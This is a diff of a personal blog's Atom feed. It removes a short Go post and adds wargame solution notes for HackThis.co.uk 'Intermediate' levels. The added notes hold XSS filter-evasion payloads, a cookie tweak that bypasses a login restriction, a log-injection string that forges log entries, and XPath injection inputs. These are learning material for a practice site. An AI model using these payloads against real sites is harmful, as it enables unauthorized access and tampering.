@@ -4,7 +4,7 @@
   <title><![CDATA[Zhengyang Song's Notepad]]></title>
   <link href="http://songzy12.github.io/atom.xml" rel="self"/>
   <link href="http://songzy12.github.io/"/>
-  <updated>2018-10-06T13:59:48+08:00</updated>
+  <updated>2018-10-06T14:27:13+08:00</updated>
   <id>http://songzy12.github.io/</id>
   <author>
     <name><![CDATA[Zhengyang Song]]></name>
@@ -2591,43 +2591,6 @@ $\max x_1\cdot x_2\dots x_{n-1}\cdot x_n$</p>
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[Go]]></title>
-    <link href="http://songzy12.github.io/blog/2017/04/06/go/"/>
-    <updated>2017-04-06T17:01:15+08:00</updated>
-    <id>http://songzy12.github.io/blog/2017/04/06/go</id>
-    <content type="html"><![CDATA[<h2>timeout</h2>
-
-<p>select: non-blocking channel operations</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>timeout := make (chan bool, 1)
-</span><span class='line'>go func() {
-</span><span class='line'>    time.Sleep(1e9) // sleep one second
-</span><span class='line'>    timeout &lt;- true
-</span><span class='line'>}()
-</span><span class='line'>ch := make (chan int)
-</span><span class='line'>select {
-</span><span class='line'>case &lt;- ch:
-</span><span class='line'>case &lt;- timeout:
-</span><span class='line'>    fmt.Println("timeout!")
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-
-]]></content>
-  </entry>
-  
-  <entry>
     <title type="html"><![CDATA[Crypt]]></title>
     <link href="http://songzy12.github.io/blog/2017/04/04/crypt/"/>
     <updated>2017-04-04T22:20:23+08:00</updated>
@@ -2971,6 +2934,133 @@ $\max x_1\cdot x_2\dots x_{n-1}\cdot x_n$</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>a=window.location.host+"";b=a.length;c=4+((5*10)*2);d=String.fromCharCode(c,-(41-Math.floor(1806/13)),Math.sqrt(b-2)*29,(b*8)-29);p=prompt("Password:","");if(p==d){window.location="?pass="+p;}else{window.location="/levels/";}</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Intermediate]]></title>
+    <link href="http://songzy12.github.io/blog/2017/03/25/intermediate/"/>
+    <updated>2017-03-25T15:40:05+08:00</updated>
+    <id>http://songzy12.github.io/blog/2017/03/25/intermediate</id>
+    <content type="html"><![CDATA[<h2>Intermediate Level 1</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$.get("https://www.hackthis.co.uk/levels/intermediate/1",{password:"flubergump"})</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Intermediate Level 2</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$.post("https://www.hackthis.co.uk/levels/intermediate/2",{password:"flubergump"})</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Intermediate Level 3</h2>
+
+<p><a href="https://stackoverflow.com/questions/15603561/how-can-i-debug-a-http-post-in-chrome">Here</a> is how you can inspect all the get, post request happened in the network request process.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>3?enter</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Cookie:restricted_login=false</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>document.cookie="restricted_login=true"</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Intermediate Level 4</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;ScRipt&gt;document.write('&lt;scri');
+</span><span class='line'>
+</span><span class='line'>document.write('pt&gt;');
+</span><span class='line'>
+</span><span class='line'>document.write("alert('HackThis!!');")
+</span><span class='line'>
+</span><span class='line'>document.write('&lt;/scri');
+</span><span class='line'>
+</span><span class='line'>document.write('pt&gt;"');
+</span><span class='line'>
+</span><span class='line'>&lt;/ScRipt&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;ScripT&gt;alert('HackThis!!');&lt;/sCriPt&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>XSS Filter Evasion <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">Cheat Sheet</a>.</p>
+
+<p>OWASP: open web application security project.</p>
+
+<p>OWASP Cheat Sheet <a href="https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series">Series</a>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;scr&lt;script&gt;ipt&gt;alert('HackThis!!');&lt;/scr&lt;/script&gt;ipt&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Intermediate Level 5</h2>
+
+<p><a href="https://www.owasp.org/index.php/Log_Injection">log injection</a></p>
+
+<p><code>twenty-one%0a%0aINFO:+User+logged+out%3dbadguy</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Apr 02 11:09:24: Failed password for songzy from 59.66.123.1
+</span><span class='line'>Apr 02 11:10:42: Failed password for songzy from 59.66.123.1</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>songzy from 59.66.123.1\nApr 02 11:10:42: Failed password for songzy</code></p>
+
+<h2>Intermediate Level 6</h2>
+
+<p><a href="https://www.owasp.org/index.php/XPATH_Injection">XPath Injection</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Username: blah' or 1=1 or 'a'='a
+</span><span class='line'>Password: blah
+</span><span class='line'>
+</span><span class='line'>FindUserXPath becomes //Employee[UserName/text()='blah' or 1=1 or 
+</span><span class='line'>        'a'='a' And Password/text()='blah']
+</span><span class='line'>
+</span><span class='line'>Logically this is equivalent to:
+</span><span class='line'>        //Employee[(UserName/text()='blah' or 1=1) or 
+</span><span class='line'>        ('a'='a' And Password/text()='blah')]</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>' or realname/text()='Sandra Murphy' or 'a'='a
+</span><span class='line'>blah</span></code></pre></td></tr></table></div></figure>
 
 ]]></content>
   </entry>
